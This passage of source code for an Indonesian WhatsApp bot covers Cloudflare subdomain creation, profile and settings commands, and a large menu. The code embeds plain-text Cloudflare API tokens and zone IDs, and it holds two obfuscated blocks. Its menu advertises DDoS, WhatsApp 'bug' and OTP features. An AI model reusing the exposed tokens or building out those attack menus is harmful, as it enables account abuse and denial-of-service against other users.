let zone = "11d2b0d7530d8e7ad402add6a48af1ff";
let apitoken = "tRlspCybESG4WKe2DmKwCgknTW7-o6DttTzi4tcz";
let tld = "xstxyro.xyz";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain11': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "8131325c84cf0fa4a598b84a08a1499f";
let apitoken = "Ns8P16D2HrEi0Jgb8rne2BThHpM-9YlG6H6Wptzk";
let tld = "sanzofficial.my.id";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break
case 'domain12': {
if (!m.isGroup) return reply2(mess.group)
if (!jangan) return reply(`*Group tidak memiliki akses dari owner !*\n\nHubungi Owner untuk mendapatkan akses group\n${owner}`)
function subDomain1(host, ip) {
return new Promise((resolve) => {
let zone = "9ce49449125aefdff62687455090056e";
let apitoken = "maGRj3tSJvOV9NL98aD-Dzr2X_OdzYSGC8yYZ3l4";
let tld = "azaypanelestore.online";
axios
.post(
`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apitoken,
"Content-Type": "application/json",
},
}
)
.then((e) => {
let res = e.data;
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
})
.catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
let err1Str = String(err1);
resolve({ success: false, error: err1Str });
});
});
}
let raw1 = args?.join(" ")?.trim();
if (!raw1) return reply(`PENGGUNAAN .${command} hostname|167.29.379.23`);
let host1 = raw1
.split("|")[0]
.trim()
.replace(/[^a-z0-9.-]/gi, "");
if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
subDomain1(host1, ip1).then((e) => {
if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By ${pushname}_*`);
else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
}); }
break

// BATAS DOMAIN MENU


// SET MENU


case 'changeview':
                if (!isCreator) return reply(mess.owner)
                if (!q) return reply(`Mau Pilih Yang Mana?\n\n✑\n✧\n◦‎ ‎ \n◇\n⦿\n✦\n々\n⌬\n⎔`)
                if (q.includes('>')) {
                global.tTeks = `${q} • .`
                reply(`Sukses Mengubah Tampilan Ke ${q}`)
                } else {
                global.tTeks = `      ${q}‎‎‎  .`
                reply(`Sukses Mengubah Tampilan Ke ${q}`)
                }
                break
case 'viewmenu': {
//throw listMessage.sections[0].rows
let sections = [{
title: 'Menu View',
rows: [{
title: '✑',
description: `<!> change view to ✑`, 
id: '.changeview ✑'
},
{
title: '✧', 
description: `<!> change view to ✧`,
id: '.changeview ✧'
},
{
title: '◦‎', 
description: `<!> change view to ◦‎`, 
id: '.changeview ◦'
},
{
title: '◇', 
description: `<!> change view to ◇`, 
id: '.changeview ◇'
},
{
title: '⦿', 
description: `<!> change view to ⦿`, 
id: '.changeview ⦿'
},
{
title: '⎔', 
description: `<!> change view to ⎔`, 
id: '.changeview ⎔'
},
{
title: '⌬', 
description: `<!> change view to ⌬`, 
id: '.changeview ⌬'
},
{
title: '々', 
description: `<!> change view to 々`, 
id: '.changeview 々'
},
{
title: '✦', 
description: `<!> change view to ✦`, 
id: '.changeview ✦'
},
{
title: '>', 
description: `<!> change view to >`, 
id: '.changeview >'
}]
}]

let listMessage = {
    title: 'List Menu', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idsal,
 newsletterName: wm, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ''
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${footer2}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*choose the view you like*\n`,
 subtitle: "dcdXdino",
 hasMediaAttachment: false,
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ]
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'typemenu':
                if (!isCreator) return reply(mess.owner)
                if (!q) return reply(`Mau Pilih Yang Mana?\n1. V1\n2. V2\n3. V3\n4. V4\n5. V5\n6. V6\n7. V7\n8. V8`)
                global.typemenu = `${q}`
                reply(`Sukses Mengubah Typemenu Ke ${q}`)
                break
case 'set-menu': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let sections = [{
title: 'TypeMenu RerezBotz',
highlight_label: 'Recomended',
rows: [{
title: 'V12',
description: `Sendmess`, 
id: '.typemenu v1'
},
{
title: 'V2', 
description: "Context Image", 
id: '.typemenu v2'
},
{
title: 'V3', 
description: "Video", 
id: '.typemenu v3'
},
{
title: 'V4', 
description: "Store", 
id: '.typemenu v4'
},
{
title: 'V5', 
description: "Bug Call", 
id: '.typemenu v5'
},
{
title: 'V6', 
description: "Document", 
id: '.typemenu v6'
},
{
title: 'V7', 
description: "Image And Gif", 
id: '.typemenu v7'
},
{
title: 'V8', 
description: "Group", 
id: '.typemenu v8'
},
{
title: 'V9',
description: "MediaType2", 
id: '.typemenu v9'
},
{
title: 'V10', 
description: "MediaType2 + Gif", 
id: '.typemenu v10'
},
{
title: 'V11', 
description: "Sendress", 
id: '.typemenu v11'
},
{
title: 'V1', 
description: "Original Image", 
id: '.typemenu v12'
}]
}]

let listMessage = {
    title: 'Type Menu', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: Styles('silahkan pilih type menu yang tuan inginkan')
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: wm
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: `👋 ${gris}Hi ${pushname}${gris} 🪸
                    ${stime}, ɪ ᴀᴍ ᴀɴ ᴀᴜᴛᴏᴍᴀᴛᴇᴅ ꜱʏꜱᴛᴇᴍ (ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ) ᴛʜᴀᴛ ᴄᴀɴ ʜᴇʟᴘ ᴛᴏ ᴅᴏ ꜱᴏᴍᴇᴛʜɪɴɢ, ꜱᴇᴀʀᴄʜ ᴀɴᴅ ɢᴇᴛ ᴅᴀᴛᴀ / ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ᴏɴʟʏ ᴛʜʀᴏᴜɢʜ ᴡʜᴀᴛꜱᴀᴘᴘ.`,
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'setbotbio': case 'setbio': {
if (!isCreator) return reply(`Khusus owner Aja`)
if (!text) return reply(`Dimana Textnya Tuan?\nExample: ${prefix + command} RezzHost`)
    await RezzHost.updateProfileStatus(text)
    reply(`Berhasil Mengubah Bio Nomor Bot Tuan✅`)
    }
    break
case 'setvid': {
                if (!isCreator) return reply(mess.owner)
                let delb = await RezzHost.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './media/menu.mp4')
                fs.unlinkSync(delb)
                reply(mess.done)
                }
            break
case 'setquoted': {
                if (!isCreator) return reply(mess.owner)
                let delb = await RezzHost.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './media/mamak.jpg')
                fs.unlinkSync(delb)
                reply(mess.done)
                }
            break
case 'setimage': {
                if (!isCreator) return reply(mess.owner)
                let delb = await RezzHost.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './media/mamak.jpg')
                fs.unlinkSync(delb)
                reply(mess.done)
                }
            break
case 'setbotname':{
if (!isCreator) return reply(`Khusus Owner`)
if (!text) return reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} Rezz`)
    await RezzHost.updateProfileName(text)
    reply(`Berhasil Mengubah Nama Bot Tuan✅`)
    }
    break
case 'setowner': {
                if (!isCreator) return reply('kusus owner')
                if (!text) return reply(`Contoh : ${prefix + command} no owner`)
                global.owner = text.split("|")[0]
                reply(`Exif berhasil diubah menjadi\n\n• noOwner : ${global.owner}`)
        }
        break
case 'setdac': 
case 'setapikey':
case 'setcapikey':
case 'setdomain': {
                if (!isCreator) return reply('kusus owner')
                if (!text) return reply(`Contoh : ${prefix + command} domain|apikey|capikey`)
                global.domain = text.split("|")[0]
                global.apikey = text.split("|")[1]
                global.capikey = text.split("|")[2]
                reply(`Exif berhasil diubah menjadi\n\n• domain : ${global.domain}\n• apikey : ${global.apikey}\n• capikey : ${global.capikey}`)
        }
        break
case 'setexif': 
case 'setwm': {
                if (!isCreator) return reply('kusus owner')
                if (!text) return reply(`Contoh : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                reply(`Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
        }
        break
case 'setppbot': {
if (!isCreator) return reply2(mess.owner)
await loading()
reply2(mess.wait)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await RezzHost[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await RezzHost[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await RezzHost[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid',mess.success,'downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return reply2(mess.owner)
if (!m.isGroup) return reply2(mess.group)
if (!isAdmins) return reply2(mess.admin)
await loading()
reply2(mess.wait)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await RezzHost['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await RezzHost[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await RezzHost['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess[mess.success]);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break


// BATAS SET MENU


case 'menu':
case 'menunya':
case 'menubot': 
case 'xyrezz-menu': {
if (!isRegistered) return reply2(mess.regis)
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
let tekss = `
${stime}
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: tekss
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
           ...(await prepareWAMessageMedia({ image : fs.readFileSync('./media/mamak.jpg')}, { upload: RezzHost.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
             {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"<!> PRODUK ${ownername} <!>",
"sections":[
{"title":"${botname}",
"rows":[
    {
        "header":"<!> DIGIAL OCEAN AKUN <!>",
            "title":"LIST AKUN DIGIAL OCEAN BY ${ownername}",
            "description":"",
        "id":".list-do"
    },
    {
        "header":"<!> VPS DIGITAL OCEAN <!>",
            "title":"LIST VPS DIGITAL OCEAN BY ${ownername}",
            "description":"",
        "id":".list-vps"
    },
    {
        "header":"<!> OWNER PT PANEL <!>",
            "title":"LIST OWNER PT PANEL BY ${ownername}",
            "description":"",
        "id":".list-ownpt"
    },
    {
        "header":"<!> PT PANEL <!>",
            "title":"LIST PT PANEL BY ${ownername}",
            "description":"",
        "id":".list-ptpanel"
    },
    {
        "header":"<!> ADMIN PANEL <!>",
            "title":"LIST ADMIN PANEL BY ${ownername}",
            "description":"",
        "id":".list-adp"
    },
    {
        "header":"<!> RESELLER PANEL PRIPAT <!>",
            "title":"LIST RESELLER PANEL PRIPAT BY ${ownername}",
            "description":"",
        "id":".list-sellerprip"
    },
    {
        "header":"<!> RESELLER PANEL PUBLIC <!>",
            "title":"LIST RESELLER PANEL PUBLIC BY ${ownername}",
            "description":"",
        "id":".list-sellerpub"
    },
    {
        "header":"<!> PANEL SERVER PRIPAT <!>",
            "title":"LIST PANEL PRIPAT BY ${ownername}",
            "description":"",
        "id":".list-panelprip"
    },
    {
        "header":"<!> PANEL SERVER PUBLIC <!>",
            "title":"LIST PANEL PUBLIC BY ${ownername}",
            "description":"",
        "id":".list-panelpub"
    },
    {
        "header":"<!> NOKO NEGARA LUAR <!>",
            "title":"NOKOS NEGARA LUAR BY ${ownername}",
            "description":"",
        "id":".list-nokos"
    },
    {
        "header":"<!> SUNTIK SOSIAL MEDIA <!>",
            "title":"LIST SUNTIK SOSMED BY ${ownername}",
            "description":"",
        "id":".list-suntik"
    }
]
    }]
}` },
{
"name": "single_select",
"buttonParamsJson": 
`{
  "title": "<!> LIST MENU ${botname} <!>",
  "sections": [
    {
      "title": "${botname}",
      "rows": [
        {
          "header": "ALL MENU",
          "title": "<!> Display All Menu ${botname} <!>",
          "description": "",
          "id": ".allmenu"
        },
        {
          "header": "ALL MENU V2",
          "title": "<!> Display All Menu V2 ${botname} <!>",
          "description": "",
          "id": ".menuv2"
        },
        {
          "header": "OWNER MENU",
          "title": "<!> Display Owner Menu ${botname} <!>",
          "description": "",
          "id": ".ownermenu"
        },
        {
          "header": "DOWNLOAD MENU",
          "title": "<!> Display Download Menu ${botname} <!>",
          "description": "",
          "id": ".downloadmenu"
        },
        {
          "header": "SEARCH MENU",
          "title": "<!> Display Search Menu ${botname} <!>",
          "description": "",
          "id": ".searchmenu"
        },
        {
          "header": "RPG MENU",
          "title": "<!> Display RPG Menu ${botname}",
          "description": "",
          "id": ".rpgmenu"
        },
        {
          "header": "PANEL MENU",
          "title": "<!> Display Panel Menu ${botname} <!>",
          "description": "",
          "id": ".panelmenu"
        },
        {
          "header": "TOOLS MENU",
          "title": "<!> Display Tools Menu ${botname} <!>",
          "description": "",
          "id": ".toolsmenu"
        },
        {
          "header": "AI MENU",
          "title": "<!> Display AI Menu ${botname} <!>",
          "description": "",
          "id": ".aimenu"
        },
        {
          "header": "VOICE MENU",
          "title": "<!> Display Voice Menu ${botname} <!>",
          "description": "",
          "id": ".voicechangermenu"
        },
        {
          "header": "GROUP MENU",
          "title": "<!> Display Group Menu ${botname} <!>",
          "description": "",
          "id": ".groupmenu"
        },
        {
          "header": "MAIN MENU",
          "title": "<!> Display Main Menu ${botname} <!>",
          "description": "",
          "id": ".mainmenu"
        },
        {
          "header": "LINODE MENU",
          "title": "<!> Display Linode Menu ${botname} <!>",
          "description": "",
          "id": ".linodemenu"
        },
        {
          "header": "API MENU",
          "title": "<!> Display Api Menu ${botname} <!>",
          "description": "",
          "id": ".apimenu"
        },
        {
          "header": "ANIME MENU",
          "title": "<!> Display Anime Menu ${botname} <!>",
          "description": "",
          "id": ".animemenu"
        },
        {
          "header": "ASUPAN MENU",
          "title": "<!> Display Asupan Menu ${botname} <!>",
          "description": "",
          "id": ".asupanmenu"
        },
        {
          "header": "BERITA MENU",
          "title": "<!> Display Berita Menu ${botname} <!>",
          "description": "",
          "id": ".beritamenu"
        },
        {
          "header": "CUCIMATA MENU",
          "title": "<!> Display Cucimata Menu ${botname} <!>",
          "description": "",
          "id": ".cucimata"
        },
        {
          "header": "CONVERT MENU",
          "title": "<!> Display Convert Menu ${botname} <!>",
          "description": "",
          "id": ".convertmenu"
        },
        {
          "header": "DOMAIN MENU",
          "title": "<!> Display Domain Menu ${botname} <!>",
          "description": "",
          "id": ".domainmenu"
        },
        {
          "header": "EPHOTO MENU",
          "title": "<!> Display Epotho Menu ${botname} <!>",
          "description": "",
          "id": ".ephotomenu"
        },
        {
          "header": "E-PERPUS MENU",
          "title": "<!> Display E-Perpus Menu ${botname} <!>",
          "description": "",
          "id": ".e-perpusmenu"
        },
        {
          "header": "FUN MENU",
          "title": "<!> Display Fun Menu ${botname} <!>",
          "description": "",
          "id": ".funmenu"
        },
        {
          "header": "GAME MENU",
          "title": "<!> Display Game Menu ${botname} <!>",
          "description": "",
          "id": ".gamemenu"
        },
        {
          "header": "GET MENU",
          "title": "<!> Display Get Menu ${botname} <!>",
          "description": "",
          "id": ".getmenu"
        },
        {
          "header": "ISLAM MENU",
          "title": "<!> Display Islam Menu ${botname} <!>",
          "description": "",
          "id": ".islammenu"
        },
        {
          "header": "PM2 MENU",
          "title": "<!> Display PM2 Menu ${botname} <!>",
          "description": "",
          "id": ".pm2menu"
        },
        {
          "header": "VPS MENU",
          "title": "<!> Display VPS Menu ${botname} <!>",
          "description": "",
          "id": ".vpsmenu"
        },
        {
          "header": "NSFW MENU",
          "title": "<!> Display NSFW Menu ${botname} <!>",
          "description": "",
          "id": ".nsfwmenu"
        },
        {
          "header": "OTP MENU",
          "title": "<!> Display OTP Menu ${botname} <!>",
          "description": "",
          "id": ".otpmenu"
        },
        {
          "header": "OTOMATIS MENU",
          "title": "<!> Display Otomatis Menu ${botname} <!>",
          "description": "",
          "id": ".otomatismenu"
        },
        {
          "header": "RANDOM MENU",
          "title": "<!> Display Random Menu ${botname} <!>",
          "description": "",
          "id": ".randommenu"
        },
        {
          "header": "RANDOM PHOTO MENU",
          "title": "<!> Display Random Photo Menu ${botname} <!>",
          "description": "",
          "id": ".randomphoto"
        },
        {
          "header": "SET MENU",
          "title": "<!> Display Set Menu ${botname} <!>",
          "description": "",
          "id": ".setmenu"
        },
        {
          "header": "STALK MENU",
          "title": "<!> Display Stalk Menu ${botname} <!>",
          "description": "",
          "id": ".stalkmenu"
        },
        {
          "header": "STORE MENU",
          "title": "<!> Display Store Menu ${botname} <!>",
          "description": "",
          "id": ".storemenu"
        },
        {
          "header": "TESTI MENU",
          "title": "<!> Display Testi Menu ${botname} <!>",
          "description": "",
          "id": ".testimenu"
        },
        {
          "header": "TEXPRO MENU",
          "title": "<!> Display TexPro Menu ${botname} <!>",
          "description": "",
          "id": ".texpro"
        },
        {
          "header": "VN MENU",
          "title": "<!> Display VN Menu ${botname} <!>",
          "description": "",
          "id": ".vnmenu"
        },
        {
          "header": "SET-MENU BOT",
          "title": "<!> Display SET-MENU ${botname} <!>",
          "description": "",
          "id": ".set-menu"
        },
        {
          "header": "DDOS MENU",
          "title": "<!> Display DDoS Menu ${botname} <!>",
          "description": "",
          "id": ".ddosmenu"
        },
        {
          "header": "BUG MENU",
          "title": "<!> Display Bug Menu ${botname} <!>",
          "description": "",
          "id": ".bugmenu"
        }
      ]
    }
  ]
}`

},
  {
    "name": "quick_reply",
      "buttonParamsJson": `{"display_text":"Owner 👤","id":".owner"}`
        },
          {
             "name": "quick_reply",
           "buttonParamsJson": `{"display_text":"Sewa Bot 💰","id":".sewa"}`
          }
        ],
      }),
      contextInfo: {
      mentionedJid: [m.sender], 
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterJid: idsal,
      newsletterName: wm,
      serverMessageId: 143
     }
    }
   })
  }
 }
}, {})
  
await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
/*
let sections = [
{
title: 'REZZ STORE', 
highlight_label: 'Recomended',
rows: [{
title: 'SEWA BOT',
description: `SEWA ${botname}`, 
id: '.sewabot'
},
{
title: 'BUY PANEL', 
description: `BUY PANEL BY ${ownername}`, 
id: '.panel'
}]
},
{
title: 'MENU REZZ BOTZ - MD',
highlight_label: 'LIST ALL MENU',
rows: [
{
title: 'Menu All',
description: `<!> Displays All Menu`, 
id: '.allmenu'
},
{
title: 'Menu', 
description: "<!> Displays the listmenu", 
id: '.menuv2'
},
{
title: 'Menu Owner', 
description: "<!> Displays the Owner Menu", 
id: '.ownermenu'
},
{
title: 'Menu JadiBot', 
description: "<!> Displays the JadiBot Menu", 
id: '.jadibotmenu'
},
{
title: 'Menu Download', 
description: "<!> Displays the Download Menu", 
id: '.downloadmenu'
},
{
title: 'Menu Search', 
description: "<!> Displays the Search Menu", 
id: '.searchmenu'
},
{
title: 'Menu Rpg', 
description: "<!> Displays the Rpg Menu", 
id: '.rpgmenu'
},
{
title: 'Menu Panel', 
description: "<!> Displays the Panel Menu", 
id: '.panelmenu'
},
{
title: 'Menu Tools', 
description: "<!> Displays the Tools Menu", 
id: '.toolsmenu'
},
{
title: 'Menu Ai', 
description: "<!> Displays the Ai Menu", 
id: '.aimenu'
},
{
title: 'Menu Voice', 
description: "<!> Displays the Voice Menu", 
id: '.voicechangermenu'
},
{
title: 'Menu Group', 
description: "<!> Displays the Group Menu", 
id: '.groupmenu'
},
{
title: 'Menu Main', 
description: "<!> Displays the Main Menu", 
id: '.mainmenu'
},
{
title: 'Menu Linode', 
description: "<!> Displays the Linode Menu", 
id: '.linodemenu'
},
{
